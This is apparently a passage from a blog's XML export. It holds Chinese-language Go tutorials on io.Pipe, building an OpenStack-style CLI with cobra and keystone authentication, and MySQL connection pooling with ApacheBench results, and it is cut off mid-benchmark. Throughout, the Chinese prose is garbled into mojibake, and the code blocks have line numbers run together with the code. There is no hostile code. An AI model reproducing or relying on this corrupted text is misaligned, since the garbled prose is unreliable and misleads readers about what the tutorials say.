æ˜¯ç®¡é“çš„å†™å…¥ç«¯ã€‚å®ƒå®ç°äº†io.Writerå’Œio.Closeræ¥å£, å¦‚æœç®¡é“è¢«å…³é—­ï¼Œåˆ™ä¼šè¿”ä¼šä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼š å¦‚æœè¯»å–ç«¯é€šè¿‡ CloseWithError æ–¹æ³•å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å›å…³é—­æ—¶ä¼ å…¥çš„é”™è¯¯ä¿¡æ¯ã€‚ å¦‚æœè¯»å–ç«¯é€šè¿‡ Close æ–¹æ³•å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å› io.ErrClosedPipeã€‚ å¦‚æœæ˜¯å†™å…¥ç«¯å…³é—­äº†ç®¡é“ï¼Œåˆ™è¿”å› io.ErrClosedPipeã€‚ Pipe: å®ƒå°†io.Readerè¿æ¥åˆ°io.Writerã€‚ä¸€ç«¯çš„è¯»å–åŒ¹é…å¦ä¸€ç«¯çš„å†™å…¥ï¼Œç›´æ¥åœ¨è¿™ä¸¤ç«¯ä¹‹é—´å¤åˆ¶æ•°æ® 123456789101112131415161718192021222324252627282930313233343536373839404142434445package mainimport ( "fmt" "io" "log" "time")func main() &#123; Pipe()&#125;func Pipe() &#123; rPipe, wPipe := io.Pipe() go Read(rPipe) Write(wPipe) time.Sleep(2 * time.Second)&#125;func Write(pipeWriter *io.PipeWriter) &#123; _, err := pipeWriter.Write([]byte("Pipe ç®¡é“æµ‹è¯•")) if err != nil &#123; log.Fatal(err) &#125; // è®°å¾—å†™å…¥ç«¯å…³é—­Pipe pipeWriter.CloseWithError(io.EOF) fmt.Println("å†™å…¥å®Œæˆ")&#125;func Read(pipeReader *io.PipeReader) &#123; data := make([]byte, 1024) for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = pipeReader.Read(tmp) if err != nil &amp;&amp; err != io.EOF &#123; log.Fatal(err) &#125; data = append(data, tmp[:n]...) &#125; fmt.Println("Data: ", string(data))&#125;]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>io</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Golangå¼€å‘OpenStackæœåŠ¡çš„CLI]]></title>
    <url>%2F2017%2F04%2F23%2Fopenstack-golang-cli%2F</url>
    <content type="text"><![CDATA[ç”±äºæˆ‘ä»¬éœ€è¦ç¼–å†™è‡ªå·±æœåŠ¡çš„å®¢æˆ·ç«¯ï¼Œä¹‹å‰å‚è€ƒè¿‡magnumçš„pythonå®¢æˆ·ç«¯ï¼Œç¼–å†™è¿‡ä¸€ä¸ªï¼Œæ•´ä½“æ„Ÿå—å°±æ˜¯: ä¸€ä»¶ç®€å•çš„äº‹å„¿ï¼Œè¢«ä»–å°è£…çš„å¾ˆå¤æ‚ï¼Œè€Œä¸”è¿˜æœ‰ä¸€ä¸ªå…³é”®ç—›ç‚¹ï¼Œéƒ¨ç½²é—®é¢˜: 1.ä¾èµ–pythonç¯å¢ƒ 2. è¹©è„šçš„äºŒè¿›åˆ¶æ‰“åŒ…æ–¹å¼ã€‚ å› æ­¤ï¼Œä½œä¸ºä¸€ä¸ªäº§å“çš„CLIï¼Œä»¥äºŒè¿›åˆ¶æ–¹å¼äº¤ä»˜ä¼šå¸¦æ¥è¯¸å¤šæ–¹ä¾¿ï¼Œæ¯”å¦‚cloud foundryä¹Ÿç”¨golangé‡å†™äº†ä»–çš„å®¢æˆ·ç«¯éƒ¨åˆ†ã€‚ Cobraç®€ä»‹åœ¨åšå®¢çš„å¼€ç¯‡å†™è¿‡ä¸€ç¯‡cobraçš„åšå®¢: å¦‚ä½•ä½¿ç”¨golangç¼–å†™æ¼‚äº®çš„å‘½ä»¤è¡Œå·¥å…·, å¾ˆå¤šæµè¡Œçš„CLIéƒ½åŸºäºè¿™ä¸ªåº“å¼€å‘ï¼Œæ¯”å¦‚kubectl, etcdctl, dockerç­‰, åŸºæœ¬çš„æ¦‚å¿µå’Œç”¨æ³•è¯·å‚è€ƒä¹‹å‰çš„åšå®¢ã€‚ä¸å–œæ¬¢æˆ‘å•°å—¦çš„ï¼Œç›´æ¥çœ‹æºç :å®Œæ•´ä»£ç ç¤ºä¾‹ åŸºäºRESTfulçš„CLIæ‰“é€ çš„è¿™ä¸ªCLIæ˜¯RESTfulçš„å®¢æˆ·ç«¯, åœ¨RESTfulé‡Œé¢ä»¥èµ„æº(Resource)ä¸ºæ ¸å¿ƒï¼Œå› æ­¤å®¢æˆ·ç«¯ä¹Ÿéœ€è¦ä»¥èµ„æºçš„å½¢å¼è¡¨ç°, æ¯”å¦‚Dockerçš„ Management Commands:12345678910111213Management Commands: checkpoint Manage checkpoints container Manage containers image Manage images network Manage networks node Manage Swarm nodes plugin Manage plugins secret Manage Docker secrets service Manage services stack Manage Docker stacks swarm Manage Swarm system Manage Docker volume Manage volumes è¯¥èµ„æºå…è®¸çš„æ“ä½œ:1234567891011121314151617181920212223âœ uniresctl git:(dev_maojun) docker image -hFlag shorthand -h has been deprecated, please use --helpUsage: docker image COMMANDManage imagesOptions: --help Print usageCommands: build Build an image from a Dockerfile history Show the history of an image import Import the contents from a tarball to create a filesystem image inspect Display detailed information on one or more images load Load an image from a tar archive or STDIN ls List images prune Remove unused images pull Pull an image or a repository from a registry push Push an image or a repository to a registry rm Remove one or more images save Save one or more images to a tar archive (streamed to STDOUT by default) tag Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE å› æ­¤, è½®å»“ä¸Šæˆ‘ä»¬éœ€è¦æ‰“é€ è¿™æ ·ä¸€ç§é£æ ¼çš„RESTful CLI OpenStackæœåŠ¡ CLIæˆ‘ä»¬çš„OpenStackæœåŠ¡æ˜¯è‡ªå·±å¼€å‘çš„, å¼€å‘å‡ºæ¥çš„CLIé£æ ¼æƒ³è¦å’ŒOpenstackç¤¾åŒºé£æ ¼ä¸€è‡´(é•¿ç›¸ç›¸è¿‘), è¿™ä¸œè¥¿ç¤¾åŒºæ˜¯æ²¡æœ‰Golangç‰ˆæœ¬çš„(æœ‰çš„è¯ç»™æˆ‘ç•™è¨€, æˆ‘çœŸæ²¡æ‰¾åˆ°), å› æ­¤æ•´ä¸ªæ¶å­éœ€è¦è‡ªå·±æ„å»º, ç”±äºcobraæ¶å­æ¯”è¾ƒæˆç†Ÿ, å¦‚æœåªç”¨å®˜æ–¹çš„Flagåº“æ¥åšçš„è¯ï¼Œä¼šæœ‰å¾ˆå¤šé‡å¤å·¥ä½œ, å› æ­¤ä½¿ç”¨cobraä¸ºåŸºç¡€æ¥è¿›è¡Œæ„å»ºã€‚ è¦åšæˆå’ŒOpenstacké£æ ¼ç±»ä¼¼çš„CLI, åœ¨cobraçš„åŸºç¡€ä¸Šæˆ‘ä»¬éœ€è¦åŠ å…¥2ä¸ªç»„ä»¶: keystoneè®¤è¯: å¯¹æ¯ä¸€ä¸ªèµ„æºçš„è®¿é—®å¿…é¡»é€šè¿‡keystoneè®¤è¯æ‰èƒ½è®¿é—®, å› æ­¤è®¤è¯éƒ¨åˆ†æ˜¯å…¨å±€çš„ã€‚ è¡¨æ ¼è¾“å‡º: OpenstackCLIæŠŠèµ„æºä»¥Tableçš„æ–¹å¼è¾“å‡º, è¿™ä¸ªä¹Ÿéœ€è¦å•ç‹¬å®ç°ã€‚ æ­å»ºCLIæ¶å­ å®Œæ•´ä»£ç çš„æ —å­è¯·çœ‹Github: å®Œæ•´ä»£ç ç¤ºä¾‹ åˆå§‹åŒ–app, æ·»åŠ resourceAå’ŒresourceB123cobra init app-clicobra add resourceAcobra add resourceB è®¿é—®æ¯ä¸€ä¸ªresourceéƒ½éœ€è¦ç»è¿‡keystoneçš„è®¤è¯,å› æ­¤è®¤è¯å±äºä¸€ä¸ªå…¨å±€éƒ½è¦æ‰§è¡Œçš„é€»è¾‘, å¿…é¡»æ”¾åœ¨æœ€å‰é¢ï¼Œè¿™é‡ŒCobraæä¾›çš„ä¸€ç»„Hookå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ å¸¦é”™è¯¯å¤„ç†çš„Hookå½“å¤„ç†è¿‡ç¨‹ä¸­å¦‚æœäº§ç”Ÿäº†errorå¯ä»¥ç›´æ¥returnå‡ºæ¥, ä»è€Œä¸­æ–­å‘½ä»¤çš„ç»§ç»­æ‰§è¡Œ, å› æ­¤è®¤è¯éƒ¨åˆ†æˆ‘ä»¬éœ€è¦è¿™ç§å¸¦é”™è¯¯å¤„ç†çš„Hook, å› ä¸ºè®¤è¯å¤±è´¥éœ€è¦ä¸­æ–­è¯·æ±‚,å…¶æ¬¡ï¼Œcobra åœ¨å‘½ä»¤å‡½æ•°çš„æ‰§è¡Œå‰ååˆ†åˆ«è®¾ç½®äº†2ç»„Hook, æ‰§è¡Œçš„é¡ºåºå¦‚ä¸‹: PersistentPreRunE: æ— è®ºå‡½æ•° æ‰§ä¸æ‰§è¡Œ è¯¥å‡½æ•°éƒ½ä¼šè¿è¡Œ PreRunE: åœ¨å‡½æ•°æ‰§è¡Œå‰æ‰§è¡Œ RunE: æ‰§è¡Œå‡½æ•° PostRunE: å‡½æ•°æ‰§è¡Œåæ‰§è¡Œ PersistentPostRunE: æ— è®ºå‡½æ•° æ‰§ä¸æ‰§è¡Œ è¯¥å‡½æ•°éƒ½ä¼šæ‰§è¡Œ åˆ©ç”¨cobraæä¾›çš„PersistentPreRunEæ¥å®ç°éªŒè¯åŠŸèƒ½123456789101112// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "app-cli", Short: "A brief description of your application", Long: `A longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, PersistentPreRunE: auth,&#125; authå‡½æ•°å®ç°è®¤è¯å¹¶ä¸éš¾, å…³é”®æ˜¯authè¿‡åçš„token å¦‚ä½•ä¼ é€’ç»™åé¢çš„å­å‘½ä»¤ä½¿ç”¨, å‚è€ƒetcdctlå’Œdockeréƒ¨åˆ†éƒ½ä½¿ç”¨ä¸Šä¸‹æ–‡æ¥å®ç°è¿™ä¸ªéœ€æ±‚, cobraé‡Œé¢ä¹Ÿæ²¡æœ‰åœ°æ–¹ç»™æˆ‘å­˜ä¸Šä¸‹æ–‡, å› æ­¤éœ€è¦ä¸“é—¨ç”¨ä¸€ä¸ªæ¨¡å—æ¥ä¿æŒ å…¨å±€çš„ä¸Šä¸‹æ–‡, å› æ­¤éœ€è¦æ‰‹åŠ¨å®ç°ä¸€ä¸ªcommonåŒ…ã€‚123456789101112131415161718192021222324252627282930313233343536package common// GlobalFlag use to contain the all contextvar GlobalFlag *globalFlagtype globalFlag struct &#123; endpoint string token string&#125;func (g *globalFlag) SetToken(token string) &#123; g.token = token&#125;func (g *globalFlag) GetToken() string &#123; return g.token&#125;func (g *globalFlag) SetEndPoint(url string) &#123; g.endpoint = url&#125;func (g *globalFlag) GetEndPoint() string &#123; return g.endpoint&#125;func (g *globalFlag) GetClient() *Client &#123; client, _ := NewClient(g.endpoint, g.token) return client&#125;func init() &#123; if GlobalFlag == nil &#123; GlobalFlag = &amp;globalFlag&#123;&#125; &#125;&#125; æœ€ååœ¨commonåŒ…é‡Œé¢æ·»åŠ 2ä¸ªå­åŒ…: keystone, printTable, keystone ç”¨äºå®ç°ä¸keystoneè®¤è¯çš„è¿‡ç¨‹, printTableç”¨äºæ‰“å°æœ€åç»“æœçš„è¡¨æ ¼,å…·ä½“è¯¦æƒ…è¯·çœ‹æºç ã€‚ æ·»åŠ èµ„æºä¸ºæ¯ä¸€ä¸ªèµ„æºæ·»åŠ 5ä¸ªåŸºç¡€çš„æ“ä½œ:get, list, create, delete, updateã€‚å¦èµ·ä¸€ä¸ªresourceAçš„åŒ…ï¼Œå®ç°è¿™äº›æ–¹æ³•ï¼Œæ·»åŠ åˆ°å­å‘½ä»¤å³å¯ï¼Œ æ¯”å¦‚:123456789func init() &#123; RootCmd.AddCommand(resourceACmd) resourceACmd.AddCommand(resourceA.CreateCmd, resourceA.ListCmd, resourceA.GetCmd, resourceA.UpdateCmd, resourceA.DeleteCmd)&#125; å¤§æ¦‚æ•ˆæœå¦‚ä¸‹123456789101112131415161718192021222324252627282930âœ app-cli git:(master) âœ— go run main.go resourceA -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: app-cli resourceA [flags] app-cli resourceA [command]Available Commands: create create an resource delete delete an resource get get an resource list list resources update update an resourceGlobal Flags: --api-endpoint string unires service endpoint --auth_url string keyston auth url --idenntity-api-version string keystone auth version --password string keystone auth user password --project-domain-name string keystone auth user project domain --project-name string keystone auth user project name --user-domain-name string keystone auth user domain name --username string keystone auth userUse "app-cli resourceA [command] --help" for more information about a command. ä½¿ç”¨æ•ˆæœå’Œä½¿ç”¨openstackä¸€æ ·ï¼Œä½ éœ€è¦æœ‰ä¸€ä¸ªadmin_openrc ç”¨äºå¯¼å…¥ç¯å¢ƒå˜é‡12345678export OS_USERNAME=adminexport OS_PASSWORD=adminexport OS_PROJECT_NAME=admin.cloudexport OS_USER_DOMAIN_NAME=adminexport OS_PROJECT_DOMAIN_NAME=adminexport OS_AUTH_URL=http://127.0.0.1:35357/v3export OS_IDENTITY_API_VERSION=3export UNIRES_ENDPOINT=http://127.0.0.1:8080 æ¯”å¦‚12source admin_openrc./app-cli resourceA get]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>openstack</tag>
        <tag>cobra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golangä¸­mysqlè¿æ¥æ± ä½¿ç”¨]]></title>
    <url>%2F2017%2F04%2F05%2Fgolang-mysql-connection-pool%2F</url>
    <content type="text"><![CDATA[åœ¨ä½¿ç”¨golangæ¥å¤„ç†æ•°æ®åº“çš„æ—¶å€™ï¼Œä¸ºäº†æå‡æ€§èƒ½ï¼Œå¾€å¾€éƒ½ä¼šä½¿ç”¨è¿æ¥æ± ï¼Œæœ‰äº›äººå¾€å¾€ä¼šè‡ªå·±å®ç°ä¸€ä¸ªè¿æ¥æ± ï¼Œç”¨æ¥äº’ç”¨mysqlè¿æ¥ï¼Œä½†æ˜¯å¦‚æœä½ ç¨å¾®ç»†å¿ƒä¸€ç‚¹ï¼Œ å°±ä¼šå‘ç°å†…å»ºçš„sqlåŒ…å·²ç»å®ç°äº†è¿æ¥æ± ã€‚sql.Openå‡½æ•°å®é™…ä¸Šå¼è¿”å›ä¸€ä¸ªè¿æ¥æ± å¯¹è±¡ï¼Œè€Œä¸æ˜¯å•ä¸ªè¿æ¥ã€‚ golangæœ¬èº«æ²¡æœ‰æä¾›é“¾æ¥mysqlçš„é©±åŠ¨ï¼Œä½†æ˜¯å´å®šä¹‰äº†æ•°æ®åº“çš„æ ‡å‡†æ¥å£(å†…å»ºçš„sqlåŒ…), ç¬¬ä¸‰æ–¹å¼€å‘å®ç°è¿™äº›æ¥å£å°±å®Œæˆäº†ç›¸åº”é©±åŠ¨çš„å¼€å‘ã€‚ç¬¬ä¸‰æ–¹æä¾›mysqlçš„é©±åŠ¨æ¯”è¾ƒå¤šï¼Œéµå¾ªå®˜æ–¹sqlæ¥å£è§„èŒƒçš„ä¹Ÿæœ‰å¥½å‡ ä¸ª, ä½†æ˜¯ä½¿ç”¨æœ€å¹¿çš„,githubä¸Šæ˜Ÿæœ€å¤šåº”è¯¥æ˜¯https://github.com/go-sql-driver/mysql, ä»¥ä¸‹çš„æ‰€æœ‰æ“ä½œéƒ½ä»¥è¯¥é©±åŠ¨è¿›è¡Œæ¼”ç¤ºã€‚ æ•°æ®åº“çš„åŸºæœ¬æ“ä½œè¿™é‡Œä¸»è¦ä»‹ç»æ•°æ®åº“æ“ä½œä¸­ä¸€äº›å¸¸è§æ“ä½œï¼Œæ¯”å¦‚å»ºè¡¨ï¼Œä»¥åŠæ•°æ®çš„å¢åˆ æ”¹æŸ¥ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€å¼ è¡¨ï¼Œç”¨äºå­˜å‚¨æ•°æ®, æˆ‘ä»¬å¯ä»¥é€šè¿‡dbçš„Execæ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œæ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ›å»ºè¡¨çš„å‡½æ•°:123456789101112131415161718192021func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT 'ç”¨æˆ·ç¼–å·', user_name VARCHAR(45) NOT NULL COMMENT 'ç”¨æˆ·åç§°', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'ç”¨æˆ·å¹´é¾„', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'ç”¨æˆ·æ€§åˆ«', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'ç”¨æˆ·è¡¨'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125; æœ‰äº†è¡¨è¿‡åï¼Œæˆ‘ä»¬éœ€è¦æ’å…¥æ•°æ®, ç†è®ºä¸Šå¯ä»¥å°†æ’å…¥çš„SQLè¯­å¥å‡†å¤‡å¥½, å¡«å…¥Execå³å¯ï¼Œä½†æ˜¯sqlå·²ç»å¯¹è¿™ç§å¸¸ç”¨çš„åœºæ™¯æŠ½è±¡å‡ºäº†ä¸€ä¸ªPrepareæ–¹æ³•ï¼ŒPrepareæ–¹æ³•å°†SQLçš„é€»è¾‘å’Œæ•°æ®å‰¥ç¦»å¼€æ¥ï¼Œé€šè¿‡å ä½ç¬¦æ¥ç”Ÿæˆä¸€ä¸ªSQLè¡¨è¾¾å¼(statement),ç„¶åè¡¨è¾¾å¼æ‰§è¡Œæ—¶ï¼Œä¼ å…¥å…·ä½“çš„éœ€è¦æ’å…¥çš„æ•°æ®:123456789101112func insert() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125; æ’å…¥æ•°æ®è¿‡ä¼šæˆ‘ä»¬å°±å¯ä»¥ï¼Œä»ä¸­æŸ¥è¯¢æ•°æ®è®°å½•äº†ï¼ŒæŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ä»¥è¡Œä¸ºå•ä½è¿›è¡Œç»„ç»‡ï¼ˆRows)ï¼Œ RowåŒ…å«å­—æ®µå’Œå€¼ï¼Œé€šè¿‡rows.Columns()è·å–å­—æ®µï¼Œé€šè¿‡rows.Next()è·å–å€¼ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„Next()è¿™ä¸ªæ–¹æ³•ï¼Œå®ƒå’Œpythoné‡Œé¢çš„ç”Ÿæˆå™¨æ¦‚è¦å¾ˆåƒï¼ŒNextè¿”å›ä¸€ä¸ªboolå€¼ï¼Œè¡¨ç¤ºæ˜¯å¦æœ‰æ–°çš„rowæ•°æ®å‡†å¤‡å¥½äº†ï¼Œå¦‚æœå‡†å¤‡å¥½äº†ï¼Œä½¿ç”¨rows.Scan()æ¥è·å–å‡†å¤‡å¥½çš„æ•°æ®1234567891011121314151617181920212223func query() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) for rows.Next() &#123; var userId int var userName string var userAge int var userSex int rows.Columns() err = rows.Scan(&amp;userId, &amp;userName, &amp;userAge, &amp;userSex) checkErr(err) fmt.Println(userId) fmt.Println(userName) fmt.Println(userAge) fmt.Println(userSex) &#125;&#125; è¿™æ ·æ‰«ææˆ‘ä»¬çš„ç¡®èƒ½è·å–åˆ°æ•°æ®ï¼Œä½†æ˜¯æ•°æ®å¹¶æ²¡æœ‰è¢«å‹å¥½çš„ç»„ç»‡èµ·æ¥ï¼Œåœ¨pythonçš„mysqlé©±åŠ¨ä¸­æä¾›ä¸€ä¸ªç®€å•æ–¹æ³•å¯ä»¥å°†è¿™äº›è¡Œæ•°æ®ç»„ç»‡æˆä¸€ä¸ªdictè¿”å›ï¼Œå› æ­¤åœ¨golangä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†rowsçš„æ•°æ®ç»„ç»‡æˆä¸€ä¸ªmapè¿”å›ï¼Œæ–¹ä¾¿ä½¿ç”¨ã€‚12345678910111213141516171819202122232425262728func queryToMap() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) //å­—å…¸ç±»å‹ //æ„é€ scanArgsã€valuesä¸¤ä¸ªæ•°ç»„ï¼ŒscanArgsçš„æ¯ä¸ªå€¼æŒ‡å‘valuesç›¸åº”å€¼çš„åœ°å€ columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //å°†è¡Œæ•°æ®ä¿å­˜åˆ°recordå­—å…¸ err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; fmt.Println(record) &#125;&#125; æ¥ä¸‹æ¥æ˜¯æ•°æ®çš„æ›´æ–°, æ›´æ–°å’Œæ•°æ®çš„æ’å…¥åŸç†ä¸€è‡´ï¼Œåªæ˜¯åœ¨å‡†å¤‡çš„SQLé‡Œé¢é€šè¿‡WHEREæŒ‡å®šæ¡ä»¶ï¼Œä»¥æ›´æ–°æŒ‡å®šçš„æ•°æ®è®°å½•ã€‚123456789101112func update() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`UPDATE user SET user_age=?,user_sex=? WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(21, 2, 1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; æœ€åæ˜¯æ•°æ®çš„åˆ é™¤ï¼ŒåŒç†123456789101112func remove() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`DELETE FROM user WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; å¦‚ä½•è®¾ç½®è¿æ¥æ± æ•°æ®åº“æ ‡å‡†æ¥å£é‡Œé¢æœ‰3ä¸ªæ–¹æ³•ç”¨äºè®¾ç½®è¿æ¥æ± çš„å±æ€§: SetConnMaxLifetime, SetMaxIdleConns, SetMaxOpenConns SetConnMaxLifetime: è®¾ç½®ä¸€ä¸ªè¿æ¥çš„æœ€é•¿ç”Ÿå‘½å‘¨æœŸï¼Œå› ä¸ºæ•°æ®åº“æœ¬èº«å¯¹è¿æ¥æœ‰ä¸€ä¸ªè¶…æ—¶æ—¶é—´çš„è®¾ç½®ï¼Œå¦‚æœè¶…æ—¶æ—¶é—´åˆ°äº†æ•°æ®åº“ä¼šå•æ–¹é¢æ–­æ‰è¿æ¥ï¼Œæ­¤æ—¶å†ç”¨è¿æ¥æ± å†…çš„è¿æ¥è¿›è¡Œè®¿é—®å°±ä¼šå‡ºé”™, å› æ­¤è¿™ä¸ªå€¼å¾€å¾€è¦å°äºæ•°æ®åº“æœ¬èº«çš„è¿æ¥è¶…æ—¶æ—¶é—´ SetMaxIdleConns: è¿æ¥æ± é‡Œé¢å…è®¸Idelçš„æœ€å¤§è¿æ¥æ•°, è¿™äº›Idelçš„è¿æ¥ å°±æ˜¯å¹¶å‘æ—¶å¯ä»¥åŒæ—¶è·å–çš„è¿æ¥,ä¹Ÿæ˜¯ç”¨å®Œåæ”¾å›æ± é‡Œé¢çš„äº’ç”¨çš„è¿æ¥, ä»è€Œæå‡æ€§èƒ½ã€‚ SetMaxOpenConns: è®¾ç½®æœ€å¤§æ‰“å¼€çš„è¿æ¥æ•°ï¼Œé»˜è®¤å€¼ä¸º0è¡¨ç¤ºä¸é™åˆ¶ã€‚æ§åˆ¶åº”ç”¨äºæ•°æ®åº“å»ºç«‹è¿æ¥çš„æ•°é‡ï¼Œé¿å…è¿‡å¤šè¿æ¥å‹å®æ•°æ®åº“ã€‚ ä»£ç ä¸Šä½¿ç”¨å°±å¾ˆç®€å•äº†, åˆå§‹åŒ–dbæ—¶ï¼Œæ ¹æ®éœ€æ±‚è®¾ç½®å¥½è¿æ¥æ± ã€‚123456789var db *sql.DB func init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping()&#125; æ€§èƒ½å¯¹æ¯”è¿æ¥æ± å¯¹æ€§èƒ½çš„æå‡è¿˜æ˜¯å¾ˆæ˜æ˜¾çš„, ä¸‹é¢æˆ‘ä»¬å°±æµ‹è¯•å¯¹æ¯”ä¸€ä¸‹ ä½¿ç”¨è¿æ¥æ± å’Œä¸ä½¿ç”¨è¿æ¥æ± æ—¶çš„æ€§èƒ½å·®åˆ«ã€‚æµ‹è¯•ä»£ç å¦‚ä¸‹(ä¸ä½¿ç”¨è¿æ¥æ± æ—¶ æ³¨é‡Šæ‰è¿æ¥æ± ç›¸å…³è®¾ç½®):123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116package mainimport ( "database/sql" "fmt" "log" "net/http" "time" _ "github.com/go-sql-driver/mysql")var db *sql.DBfunc init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping() createTable() insert()&#125;func main() &#123; startHttpServer()&#125;func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT 'ç”¨æˆ·ç¼–å·', user_name VARCHAR(45) NOT NULL COMMENT 'ç”¨æˆ·åç§°', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'ç”¨æˆ·å¹´é¾„', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'ç”¨æˆ·æ€§åˆ«', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'ç”¨æˆ·è¡¨'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125;func insert() &#123; stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125;func queryToMap() []map[string]string &#123; var records []map[string]string rows, err := db.Query("SELECT * FROM user") defer rows.Close() checkErr(err) //å­—å…¸ç±»å‹ //æ„é€ scanArgsã€valuesä¸¤ä¸ªæ•°ç»„ï¼ŒscanArgsçš„æ¯ä¸ªå€¼æŒ‡å‘valuesç›¸åº”å€¼çš„åœ°å€ columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //å°†è¡Œæ•°æ®ä¿å­˜åˆ°recordå­—å…¸ err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; records = append(records, record) &#125; return records&#125;func startHttpServer() &#123; http.HandleFunc("/pool", pool) err := http.ListenAndServe(":9090", nil) if err != nil &#123; log.Fatal("ListenAndServe: ", err) &#125;&#125;func pool(w http.ResponseWriter, r *http.Request) &#123; records := queryToMap() fmt.Println(records) fmt.Fprintln(w, "finish")&#125;func checkErr(err error) &#123; if err != nil &#123; fmt.Println(err) panic(err) &#125;&#125; å¸¦è¿æ¥æ± çš„æµ‹è¯•ç»“æœ:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455âœ ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 0.832 secondsComplete requests: 1000Failed requests: 928 (Connect: 0, 